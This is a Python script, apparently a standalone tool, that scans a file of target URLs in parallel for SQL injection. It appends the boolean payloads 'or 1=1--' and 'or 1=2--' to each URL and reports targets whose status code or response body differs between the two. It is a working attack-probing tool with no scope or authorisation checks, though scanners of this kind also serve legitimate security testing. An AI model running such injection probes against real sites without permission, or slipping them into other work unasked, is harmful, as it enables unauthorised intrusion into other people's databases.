import requests
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict
from urllib.parse import urlparse
import argparse
import time

def make_request(url, domain_states, session, protocol, output_file):
    if domain_states[url]['unreachable']:
        return

    payloads = ["%20or%201=1--", "%20or%201=2--"]
    responses = []

    for index, payload in enumerate(payloads, start=1):
        try:
            response = session.get(f"{url}{payload}")
            responses.append(response)

            if index > 1:
                if response.status_code != responses[index - 2].status_code:
                    output(f"Status code changed for URL: {url}", output_file)
                if response.text != responses[index - 2].text:
                    output(f"Response body changed for URL: {url}", output_file)

        except requests.exceptions.RequestException:
            domain_states[url]['unreachable'] = True
            break

def output(message, output_file):
    if output_file:
        output_file.write(message + "\n")
    else:
        print(message)

def format_time(seconds):
    intervals = (
        ('weeks', 604800),
        ('days', 86400),
        ('hours', 3600),
        ('minutes', 60),
        ('seconds', 1),
    )

    result = []
    for name, count in intervals:
        value = seconds // count
        if value:
            seconds -= value * count
            if value == 1:
                name = name.rstrip('s')
            result.append(f"{int(value)} {name}")

    return ', '.join(result[:2]) if len(result) > 1 else result[0] if result else 'less than a second'

def main():
    start_time = time.time()

    parser = argparse.ArgumentParser(description='SQL injection vulnerability checker')
    parser.add_argument('-t', '--targets', type=str, help='File containing URLs to check', required=True)
    parser.add_argument('-c', '--threads', type=int, help='Number of threads', default=5)
    parser.add_argument('-p', '--protocol', type=str, choices=['http', 'https'], help='HTTP protocol', default='https')
    parser.add_argument('-o', '--output', type=str, help='Output file name')

    args = parser.parse_args()

    with open(args.targets, 'r') as file:
        urls = [url.strip() for url in file.readlines()]

    domain_states = defaultdict(lambda: {'unreachable': False})

    output_file = None
    if args.output:
        output_file = open(args.output, 'w')

    with requests.Session() as session:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            for url in urls:
                parsed_url = urlparse(url)
                new_url = url if parsed_url.scheme else f"{args.protocol}://{url}"
                executor.submit(make_request, new_url, domain_states, session, args.protocol, output_file)

    if output_file:
        output_file.close()

    end_time = time.time()
    execution_time = end_time - start_time

    formatted_time = format_time(round(execution_time))

    print(f"Script execution time: {formatted_time}")

if __name__ == "__main__":
    main()
